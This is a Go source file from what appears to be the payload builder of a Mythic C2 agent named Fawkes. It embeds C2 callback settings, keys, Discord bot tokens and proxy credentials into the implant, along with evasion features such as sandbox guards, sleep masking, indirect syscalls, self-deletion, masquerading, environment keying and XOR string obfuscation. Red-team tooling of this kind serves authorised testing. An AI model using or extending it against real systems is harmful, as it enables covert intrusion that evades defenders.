package agentfunctions

import (
	cryptorand "crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"time"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

// buildConfigLdflags extracts C2 profile parameters and build parameters from
// the payload build message and constructs the Go linker flags string (-ldflags).
// This includes C2 config (callback host/port, URIs, headers), opsec parameters
// (domain fronting, proxy, TLS, working hours, environment keying), and optional
// string obfuscation via XOR encoding.
func buildConfigLdflags(payloadBuildMsg agentstructs.PayloadBuildMessage, fawkesMainPackage string) (string, error) {
	ldflags := fmt.Sprintf("-s -w -X '%s.payloadUUID=%s'", fawkesMainPackage, payloadBuildMsg.PayloadUUID)

	// C2 profile parameters → ldflags
	for _, key := range payloadBuildMsg.C2Profiles[0].GetArgNames() {
		if key == "AESPSK" {
			cryptoVal, err := payloadBuildMsg.C2Profiles[0].GetCryptoArg(key)
			if err != nil {
				return "", err
			}
			ldflags += fmt.Sprintf(" -X '%s.encryptionKey=%s'", fawkesMainPackage, cryptoVal.EncKey)
		} else if key == "callback_host" {
			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
			if err != nil {
				return "", err
			}
			ldflags += fmt.Sprintf(" -X '%s.callbackHost=%s'", fawkesMainPackage, val)
		} else if key == "callback_port" {
			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
			if err != nil {
				return "", err
			}
			ldflags += fmt.Sprintf(" -X '%s.callbackPort=%s'", fawkesMainPackage, fmt.Sprintf("%d", int(val)))
		} else if key == "callback_interval" {
			if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
				ldflags += fmt.Sprintf(" -X '%s.sleepInterval=%d'", fawkesMainPackage, int(val))
			} else if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
				ldflags += fmt.Sprintf(" -X '%s.sleepInterval=%s'", fawkesMainPackage, val)
			}
		} else if key == "callback_jitter" {
			if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
				ldflags += fmt.Sprintf(" -X '%s.jitter=%d'", fawkesMainPackage, int(val))
			} else if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
				ldflags += fmt.Sprintf(" -X '%s.jitter=%s'", fawkesMainPackage, val)
			}
		} else if key == "headers" {
			headerMap, err := payloadBuildMsg.C2Profiles[0].GetDictionaryArg(key)
			if err != nil {
				return "", err
			}
			if userAgentVal, exists := headerMap["User-Agent"]; exists {
				ldflags += fmt.Sprintf(" -X '%s.userAgent=%s'", fawkesMainPackage, userAgentVal)
			}
			extraHeaders := make(map[string]string)
			for k, v := range headerMap {
				if k != "User-Agent" {
					extraHeaders[k] = v
				}
			}
			if len(extraHeaders) > 0 {
				jsonBytes, _ := json.Marshal(extraHeaders)
				encoded := base64.StdEncoding.EncodeToString(jsonBytes)
				ldflags += fmt.Sprintf(" -X '%s.customHeaders=%s'", fawkesMainPackage, encoded)
			}
		} else if key == "get_uri" {
			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
			if err != nil {
				return "", err
			}
			ldflags += fmt.Sprintf(" -X '%s.getURI=%s'", fawkesMainPackage, val)
		} else if key == "post_uri" {
			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
			if err != nil {
				return "", err
			}
			ldflags += fmt.Sprintf(" -X '%s.postURI=%s'", fawkesMainPackage, val)
		} else if key == "discord_token" {
			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
			if err != nil {
				return "", err
			}
			ldflags += fmt.Sprintf(" -X '%s.discordBotToken=%s'", fawkesMainPackage, val)
		} else if key == "bot_channel" {
			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
			if err != nil {
				return "", err
			}
			ldflags += fmt.Sprintf(" -X '%s.discordChannelID=%s'", fawkesMainPackage, val)
		} else if key == "message_checks" {
			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
				ldflags += fmt.Sprintf(" -X '%s.discordPollChecks=%s'", fawkesMainPackage, val)
			}
		} else if key == "time_between_checks" {
			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
				ldflags += fmt.Sprintf(" -X '%s.discordPollDelay=%s'", fawkesMainPackage, val)
			}
		} else if key == "raw_c2_config" {
			if fileID, err := payloadBuildMsg.C2Profiles[0].GetFileArg(key); err == nil && fileID != "" {
				fileResp, err := mythicrpc.SendMythicRPCFileGetContent(mythicrpc.MythicRPCFileGetContentMessage{
					AgentFileID: fileID,
				})
				if err != nil {
					return "", fmt.Errorf("failed to download raw_c2_config: %w", err)
				}
				if !fileResp.Success {
					return "", fmt.Errorf("failed to get raw_c2_config content: %s", fileResp.Error)
				}
				encoded := base64.StdEncoding.EncodeToString(fileResp.Content)
				ldflags += fmt.Sprintf(" -X '%s.httpxConfig=%s'", fawkesMainPackage, encoded)
			}
		} else if key == "callback_domains" {
			if val, err := payloadBuildMsg.C2Profiles[0].GetArrayArg(key); err == nil && len(val) > 0 {
				joined := strings.Join(val, ",")
				ldflags += fmt.Sprintf(" -X '%s.httpxDomains=%s'", fawkesMainPackage, joined)
			}
		} else if key == "domain_rotation" {
			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
				ldflags += fmt.Sprintf(" -X '%s.httpxRotation=%s'", fawkesMainPackage, val)
			}
		} else if key == "failover_threshold" {
			if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
				ldflags += fmt.Sprintf(" -X '%s.httpxFailoverThreshold=%d'", fawkesMainPackage, int(val))
			}
		}
	}

	// Opsec build parameters
	if hostHeader, err := payloadBuildMsg.BuildParameters.GetStringArg("host_header"); err == nil && hostHeader != "" {
		ldflags += fmt.Sprintf(" -X '%s.hostHeader=%s'", fawkesMainPackage, hostHeader)
	}
	if proxyURL, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_url"); err == nil && proxyURL != "" {
		ldflags += fmt.Sprintf(" -X '%s.proxyURL=%s'", fawkesMainPackage, proxyURL)
	}
	if proxyUser, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_user"); err == nil && proxyUser != "" {
		ldflags += fmt.Sprintf(" -X '%s.proxyUser=%s'", fawkesMainPackage, proxyUser)
	}
	if proxyPass, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_pass"); err == nil && proxyPass != "" {
		ldflags += fmt.Sprintf(" -X '%s.proxyPass=%s'", fawkesMainPackage, proxyPass)
	}
	if fbHosts, err := payloadBuildMsg.BuildParameters.GetStringArg("fallback_hosts"); err == nil && fbHosts != "" {
		ldflags += fmt.Sprintf(" -X '%s.fallbackHosts=%s'", fawkesMainPackage, fbHosts)
	}
	if ct, err := payloadBuildMsg.BuildParameters.GetStringArg("content_types"); err == nil && ct != "" {
		ldflags += fmt.Sprintf(" -X '%s.contentTypes=%s'", fawkesMainPackage, ct)
	}
	if tp, err := payloadBuildMsg.BuildParameters.GetStringArg("traffic_profile"); err == nil && tp != "" && tp != "generic" {
		ldflags += fmt.Sprintf(" -X '%s.trafficProfile=%s'", fawkesMainPackage, tp)
	}
	if tlsVerify, err := payloadBuildMsg.BuildParameters.GetStringArg("tls_verify"); err == nil && tlsVerify != "" {
		ldflags += fmt.Sprintf(" -X '%s.tlsVerify=%s'", fawkesMainPackage, tlsVerify)
	}
	if tlsFP, err := payloadBuildMsg.BuildParameters.GetStringArg("tls_fingerprint"); err == nil && tlsFP != "" && tlsFP != "go" {
		ldflags += fmt.Sprintf(" -X '%s.tlsFingerprint=%s'", fawkesMainPackage, tlsFP)
	}
	// mTLS client certificate (base64-encode PEM to survive ldflags)
	if mtlsCert, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_cert"); err == nil && mtlsCert != "" {
		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsCert))
		ldflags += fmt.Sprintf(" -X '%s.mtlsCertPEM=%s'", fawkesMainPackage, encoded)
	}
	if mtlsKey, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_key"); err == nil && mtlsKey != "" {
		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsKey))
		ldflags += fmt.Sprintf(" -X '%s.mtlsKeyPEM=%s'", fawkesMainPackage, encoded)
	}

	// TCP P2P bind address
	if tcpBind, err := payloadBuildMsg.BuildParameters.GetStringArg("tcp_bind_address"); err == nil && tcpBind != "" {
		ldflags += fmt.Sprintf(" -X '%s.tcpBindAddress=%s'", fawkesMainPackage, tcpBind)
	}

	// Named pipe P2P name (Windows only)
	if pipeName, err := payloadBuildMsg.BuildParameters.GetStringArg("namedpipe_bind_name"); err == nil && pipeName != "" {
		ldflags += fmt.Sprintf(" -X '%s.namedPipeBindName=%s'", fawkesMainPackage, pipeName)
	}

	// Working hours opsec parameters
	if whStart, err := payloadBuildMsg.BuildParameters.GetStringArg("working_hours_start"); err == nil && whStart != "" {
		ldflags += fmt.Sprintf(" -X '%s.workingHoursStart=%s'", fawkesMainPackage, whStart)
	}
	if whEnd, err := payloadBuildMsg.BuildParameters.GetStringArg("working_hours_end"); err == nil && whEnd != "" {
		ldflags += fmt.Sprintf(" -X '%s.workingHoursEnd=%s'", fawkesMainPackage, whEnd)
	}
	if whDays, err := payloadBuildMsg.BuildParameters.GetStringArg("working_days"); err == nil && whDays != "" {
		ldflags += fmt.Sprintf(" -X '%s.workingDays=%s'", fawkesMainPackage, whDays)
	}

	// Environment keying / guardrails
	if ekHostname, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_hostname"); err == nil && ekHostname != "" {
		ldflags += fmt.Sprintf(" -X '%s.envKeyHostname=%s'", fawkesMainPackage, ekHostname)
	}
	if ekDomain, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_domain"); err == nil && ekDomain != "" {
		ldflags += fmt.Sprintf(" -X '%s.envKeyDomain=%s'", fawkesMainPackage, ekDomain)
	}
	if ekUsername, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_username"); err == nil && ekUsername != "" {
		ldflags += fmt.Sprintf(" -X '%s.envKeyUsername=%s'", fawkesMainPackage, ekUsername)
	}
	if ekProcess, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_process"); err == nil && ekProcess != "" {
		ldflags += fmt.Sprintf(" -X '%s.envKeyProcess=%s'", fawkesMainPackage, ekProcess)
	}
	if selfDel, err := payloadBuildMsg.BuildParameters.GetBooleanArg("self_delete"); err == nil && selfDel {
		ldflags += fmt.Sprintf(" -X '%s.selfDelete=true'", fawkesMainPackage)
	}
	if masqName, err := payloadBuildMsg.BuildParameters.GetStringArg("masquerade_name"); err == nil && masqName != "" {
		ldflags += fmt.Sprintf(" -X '%s.masqueradeName=%s'", fawkesMainPackage, masqName)
	}
	if autoPatch, err := payloadBuildMsg.BuildParameters.GetBooleanArg("auto_patch"); err == nil && autoPatch {
		ldflags += fmt.Sprintf(" -X '%s.autoPatch=true'", fawkesMainPackage)
	}
	if blockDlls, err := payloadBuildMsg.BuildParameters.GetBooleanArg("block_dlls"); err == nil && blockDlls {
		ldflags += fmt.Sprintf(" -X '%s.blockDLLs=true'", fawkesMainPackage)
	}
	if indSyscalls, err := payloadBuildMsg.BuildParameters.GetBooleanArg("indirect_syscalls"); err == nil && indSyscalls {
		ldflags += fmt.Sprintf(" -X '%s.indirectSyscalls=true'", fawkesMainPackage)
	}
	if sbGuard, err := payloadBuildMsg.BuildParameters.GetBooleanArg("sandbox_guard"); err == nil && sbGuard {
		ldflags += fmt.Sprintf(" -X '%s.sandboxGuard=true'", fawkesMainPackage)
	}
	if slpMask, err := payloadBuildMsg.BuildParameters.GetBooleanArg("sleep_mask"); err == nil && slpMask {
		ldflags += fmt.Sprintf(" -X '%s.sleepMask=true'", fawkesMainPackage)
	}
	if slpGuard, err := payloadBuildMsg.BuildParameters.GetBooleanArg("sleep_guard_pages"); err == nil && slpGuard {
		ldflags += fmt.Sprintf(" -X '%s.sleepGuardPages=true'", fawkesMainPackage)
	}
	if jpStr, err := payloadBuildMsg.BuildParameters.GetStringArg("jitter_profile"); err == nil && jpStr != "" && jpStr != "uniform" {
		ldflags += fmt.Sprintf(" -X '%s.jitterProfile=%s'", fawkesMainPackage, jpStr)
	}

	// Kill date: parse date string to Unix timestamp
	if kdStr, err := payloadBuildMsg.BuildParameters.GetStringArg("kill_date"); err == nil && kdStr != "" {
		var kdTime time.Time
		var parseErr error
		if kdTime, parseErr = time.Parse("2006-01-02 15:04", kdStr); parseErr != nil {
			if kdTime, parseErr = time.Parse("2006-01-02", kdStr); parseErr != nil {
				return "", fmt.Errorf("invalid kill_date format %q — use YYYY-MM-DD or YYYY-MM-DD HH:MM", kdStr)
			}
		}
		ldflags += fmt.Sprintf(" -X '%s.killDate=%d'", fawkesMainPackage, kdTime.Unix())
	}

	// User-Agent pool
	if uaPool, err := payloadBuildMsg.BuildParameters.GetStringArg("user_agent_pool"); err == nil && uaPool != "" {
		ldflags += fmt.Sprintf(" -X '%s.userAgentPool=%s'", fawkesMainPackage, strings.ReplaceAll(uaPool, "'", ""))
	}

	// HTTP timeout
	if htStr, err := payloadBuildMsg.BuildParameters.GetStringArg("http_timeout"); err == nil && htStr != "" && htStr != "30" {
		if _, parseErr := strconv.Atoi(htStr); parseErr != nil {
			return "", fmt.Errorf("invalid http_timeout %q — must be a number", htStr)
		}
		ldflags += fmt.Sprintf(" -X '%s.httpTimeout=%s'", fawkesMainPackage, htStr)
	}

	// Max retries
	if mrStr, err := payloadBuildMsg.BuildParameters.GetStringArg("max_retries"); err == nil && mrStr != "" {
		if _, parseErr := strconv.Atoi(mrStr); parseErr != nil {
			return "", fmt.Errorf("invalid max_retries %q — must be a number", mrStr)
		}
		ldflags += fmt.Sprintf(" -X '%s.maxRetries=%s'", fawkesMainPackage, mrStr)
	}

	// Recovery interval for unhealthy domains
	if riStr, err := payloadBuildMsg.BuildParameters.GetStringArg("recovery_interval"); err == nil && riStr != "" && riStr != "600" {
		if _, parseErr := strconv.Atoi(riStr); parseErr != nil {
			return "", fmt.Errorf("invalid recovery_interval %q — must be a number", riStr)
		}
		ldflags += fmt.Sprintf(" -X '%s.recoveryInterval=%s'", fawkesMainPackage, riStr)
	}

	// String obfuscation: XOR-encode C2 config strings with a random key
	if obfStrings, err := payloadBuildMsg.BuildParameters.GetBooleanArg("obfuscate_strings"); err == nil && obfStrings {
		var obfErr error
		ldflags, obfErr = applyStringObfuscation(payloadBuildMsg, fawkesMainPackage, ldflags)
		if obfErr != nil {
			return "", obfErr
		}
	}

	return ldflags, nil
}

// applyStringObfuscation generates a random XOR key and re-encodes sensitive
// C2 config strings already present in ldflags with XOR encryption.
func applyStringObfuscation(payloadBuildMsg agentstructs.PayloadBuildMessage, fawkesMainPackage, ldflags string) (string, error) {
	xorKey := make([]byte, 32)
	if _, err := cryptorand.Read(xorKey); err != nil {
		return "", fmt.Errorf("failed to generate XOR key: %w", err)
	}
	xorKeyB64 := base64.StdEncoding.EncodeToString(xorKey)
	ldflags += fmt.Sprintf(" -X '%s.xorKey=%s'", fawkesMainPackage, xorKeyB64)

	type obfVar struct {
		name  string
		value string
	}
	var obfVars []obfVar

	// Extract C2 profile string values for re-encoding
	for _, key := range payloadBuildMsg.C2Profiles[0].GetArgNames() {
		switch key {
		case "callback_host":
			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
				obfVars = append(obfVars, obfVar{"callbackHost", val})
			}
		case "callback_port":
			if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
				obfVars = append(obfVars, obfVar{"callbackPort", fmt.Sprintf("%d", int(val))})
			}
		case "get_uri":
			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
				obfVars = append(obfVars, obfVar{"getURI", val})
			}
		case "post_uri":
			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
				obfVars = append(obfVars, obfVar{"postURI", val})
			}
		case "headers":
			if headerMap, err := payloadBuildMsg.C2Profiles[0].GetDictionaryArg(key); err == nil {
				if uaVal, exists := headerMap["User-Agent"]; exists {
					obfVars = append(obfVars, obfVar{"userAgent", uaVal})
				}
			}
		case "AESPSK":
			if cryptoVal, err := payloadBuildMsg.C2Profiles[0].GetCryptoArg(key); err == nil {
				obfVars = append(obfVars, obfVar{"encryptionKey", cryptoVal.EncKey})
			}
		case "discord_token":
			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
				obfVars = append(obfVars, obfVar{"discordBotToken", val})
			}
		case "bot_channel":
			if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil && val != "" {
				obfVars = append(obfVars, obfVar{"discordChannelID", val})
			}
		case "callback_domains":
			if val, err := payloadBuildMsg.C2Profiles[0].GetArrayArg(key); err == nil && len(val) > 0 {
				obfVars = append(obfVars, obfVar{"httpxDomains", strings.Join(val, ",")})
			}
		}
	}

	// Build parameter values to encode
	obfVars = append(obfVars, obfVar{"payloadUUID", payloadBuildMsg.PayloadUUID})
	if hostHeader, err := payloadBuildMsg.BuildParameters.GetStringArg("host_header"); err == nil && hostHeader != "" {
		obfVars = append(obfVars, obfVar{"hostHeader", hostHeader})
	}
	if proxyURL, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_url"); err == nil && proxyURL != "" {
		obfVars = append(obfVars, obfVar{"proxyURL", proxyURL})
	}
	if proxyUser, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_user"); err == nil && proxyUser != "" {
		obfVars = append(obfVars, obfVar{"proxyUser", proxyUser})
	}
	if proxyPass, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_pass"); err == nil && proxyPass != "" {
		obfVars = append(obfVars, obfVar{"proxyPass", proxyPass})
	}
	if fbHosts, err := payloadBuildMsg.BuildParameters.GetStringArg("fallback_hosts"); err == nil && fbHosts != "" {
		obfVars = append(obfVars, obfVar{"fallbackHosts", fbHosts})
	}
	if ct, err := payloadBuildMsg.BuildParameters.GetStringArg("content_types"); err == nil && ct != "" {
		obfVars = append(obfVars, obfVar{"contentTypes", ct})
	}
	if tp, err := payloadBuildMsg.BuildParameters.GetStringArg("traffic_profile"); err == nil && tp != "" && tp != "generic" {
		obfVars = append(obfVars, obfVar{"trafficProfile", tp})
	}
	if uap, err := payloadBuildMsg.BuildParameters.GetStringArg("user_agent_pool"); err == nil && uap != "" {
		obfVars = append(obfVars, obfVar{"userAgentPool", strings.ReplaceAll(uap, "'", "")})
	}
	// mTLS cert/key (already base64 in ldflags, obfuscate the base64 string)
	if mtlsCert, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_cert"); err == nil && mtlsCert != "" {
		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsCert))
		obfVars = append(obfVars, obfVar{"mtlsCertPEM", encoded})
	}
	if mtlsKey, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_key"); err == nil && mtlsKey != "" {
		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsKey))
		obfVars = append(obfVars, obfVar{"mtlsKeyPEM", encoded})
	}

	// Replace plaintext values in ldflags with XOR-encoded versions
	for _, v := range obfVars {
		plainPattern := fmt.Sprintf("-X '%s.%s=%s'", fawkesMainPackage, v.name, v.value)
		encodedVal := xorEncodeString(v.value, xorKey)
		encodedPattern := fmt.Sprintf("-X '%s.%s=%s'", fawkesMainPackage, v.name, encodedVal)
		ldflags = strings.Replace(ldflags, plainPattern, encodedPattern, 1)
	}

	// customHeaders is already base64 — re-encode the base64 string itself
	if customHeadersB64 := extractLdflagValue(ldflags, fawkesMainPackage, "customHeaders"); customHeadersB64 != "" {
		plainPattern := fmt.Sprintf("-X '%s.customHeaders=%s'", fawkesMainPackage, customHeadersB64)
		encodedVal := xorEncodeString(customHeadersB64, xorKey)
		encodedPattern := fmt.Sprintf("-X '%s.customHeaders=%s'", fawkesMainPackage, encodedVal)
		ldflags = strings.Replace(ldflags, plainPattern, encodedPattern, 1)
	}
	// httpxConfig is already base64 — re-encode the base64 string itself
	if httpxCfgB64 := extractLdflagValue(ldflags, fawkesMainPackage, "httpxConfig"); httpxCfgB64 != "" {
		plainPattern := fmt.Sprintf("-X '%s.httpxConfig=%s'", fawkesMainPackage, httpxCfgB64)
		encodedVal := xorEncodeString(httpxCfgB64, xorKey)
		encodedPattern := fmt.Sprintf("-X '%s.httpxConfig=%s'", fawkesMainPackage, encodedVal)
		ldflags = strings.Replace(ldflags, plainPattern, encodedPattern, 1)
	}

	return ldflags, nil
}

// extractLdflagValue extracts the value of a variable from ldflags string.
func extractLdflagValue(ldflags, pkg, varName string) string {
	prefix := fmt.Sprintf("-X '%s.%s=", pkg, varName)
	idx := strings.Index(ldflags, prefix)
	if idx < 0 {
		return ""
	}
	start := idx + len(prefix)
	end := strings.Index(ldflags[start:], "'")
	if end < 0 {
		return ""
	}
	return ldflags[start : start+end]
}

// xorEncodeString XOR-encodes a plaintext string with the given key and returns base64.
func xorEncodeString(plaintext string, key []byte) string {
	if len(key) == 0 || plaintext == "" {
		return plaintext
	}
	data := []byte(plaintext)
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	return base64.StdEncoding.EncodeToString(result)
}
